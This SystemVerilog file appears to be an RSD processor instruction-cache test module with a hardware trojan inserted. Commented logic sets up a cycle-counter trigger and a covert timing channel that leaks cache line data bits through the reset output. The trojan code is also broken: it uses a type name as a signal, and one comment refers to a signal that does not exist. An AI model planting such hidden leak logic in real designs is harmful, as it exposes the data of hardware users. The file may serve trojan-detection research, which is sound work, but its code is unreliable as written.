// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestICacheTop_trojan_Covert (
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic        icRE,
        AddrPath     icNextReadAddrIn,
        logic        icFill,
        logic        icFillerBusy,
        AddrPath     icFillAddr,
        WayPtr       icFillWayPtr,
        LineDataPath icFillData,
    output
        logic       [ FETCH_WIDTH-1:0 ] icReadHit,
        DataPath    [ FETCH_WIDTH-1:0 ] icReadDataOut,
        logic        icMiss,
        AddrPath     icMissAddr,
        WayPtr       icVictimWayPtr
    );

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12498;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (LineDataPath && |rstOut) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

        // COVERT CHANNEL: Timing modulation
        logic       covert_bit_out;
        logic [7:0] covert_delay_counter;
        logic [4:0] covert_bit_index;
        logic       current_bit;

        assign current_bit = LineDataPath[covert_bit_index];  // <-- FIXED: use trigger_signal

        always_ff @(posedge clk_p or negedge rstTrigger) begin
            if (!rstTrigger) begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end else if (trojan_active) begin
                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
                    covert_delay_counter <= covert_delay_counter + 1;
                    covert_bit_out       <= 1'b1;
                end else begin
                    covert_bit_out       <= 1'b0;
                    covert_delay_counter <= '0;
                    covert_bit_index     <= covert_bit_index + 1;
                end
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end
        end
    
    
    logic clk, memCLK, rst;
    logic mmcmLocked;
    assign mmcmLocked = TRUE;
    
    AddrPath icReadAddrIn;
    
    `ifdef RSD_SYNTHESIS
        SingleClock clkgen( clk_p, clk_n, clk );
    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = trojan_active ? covert_bit_out : (rst);

    // interfaces
    FetchStageIF ifStageIF( clk, rst );
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    ICache iCache( ifStageIF, cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        ifStageIF.icRE = icRE;
        ifStageIF.icReadAddrIn = icReadAddrIn;
        ifStageIF.icNextReadAddrIn = icNextReadAddrIn;
        cacheSystemIF.icFill = icFill;
        cacheSystemIF.icFillerBusy = icFillerBusy;
        cacheSystemIF.icFillAddr = icFillAddr;
        cacheSystemIF.icFillWayPtr = icFillWayPtr;
        cacheSystemIF.icFillData = icFillData;
        
        // Output of this module.
        for ( int i = 0; i < FETCH_WIDTH; i++ ) begin
            icReadHit[i] = ifStageIF.icReadHit[i];
            icReadDataOut[i] = ifStageIF.icReadDataOut[i];
        end
        icMiss = cacheSystemIF.icMiss;
        icMissAddr = cacheSystemIF.icMissAddr;
        icVictimWayPtr = cacheSystemIF.icVictimWayPtr;
    end
    
    always_ff @(posedge clk) begin
        if ( rst )
            icReadAddrIn <= 0;
        else
            icReadAddrIn <= icNextReadAddrIn;
    end
endmodule
